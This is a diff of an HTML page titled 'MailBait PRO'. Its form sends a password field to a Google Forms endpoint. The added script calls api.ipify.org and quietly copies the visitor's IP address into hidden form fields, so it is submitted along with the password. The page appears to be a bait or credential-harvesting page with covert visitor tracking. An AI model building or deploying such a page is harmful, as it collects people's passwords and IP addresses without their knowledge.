@@ -132,7 +132,7 @@ src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
 
 <div class="col3">
 <h2>MailBait PRO</h2>
-<form name="f2" id="f2" target="iframe2" action="https://docs.google.com/forms/d/1Dh2erHs6pdqBAG8tprXgBDN-XSjNJtYoyajr36hGFsk/formResponse?pli=1" method="POST">
+<form name="f3" id="f3" target="iframe2" action="https://docs.google.com/forms/d/1Dh2erHs6pdqBAG8tprXgBDN-XSjNJtYoyajr36hGFsk/formResponse?pli=1" method="POST">
 <fieldset>
   
 
@@ -145,7 +145,7 @@ src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
   
   <label for="pass">Password</label>
   <input type="password" name="entry.45877131" id="pass"/>
-  <input type="hidden" name="entry.1356848538" value="" id="ip2" /> <!-- ip -->
+  <input type="hidden" name="entry.1356848538" value="" id="ip3" /> <!-- ip -->
 </div>
 </fieldset>
   
@@ -193,6 +193,18 @@ ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www')
 var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
 })();
 </script>
+
+<script type="application/javascript">
+  function CheckPro(json) {
+    console.log("NSA HoneyPot3 signaled: ", json.ip);
+    document.getElementById('ip1').value=json.ip;
+    document.getElementById('ip2').value=json.ip;
+    document.getElementById('ip3').value=json.ip;
+
+  }
+</script>
+
+<script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=CheckPro"></script>
 
 </body>
 </html>
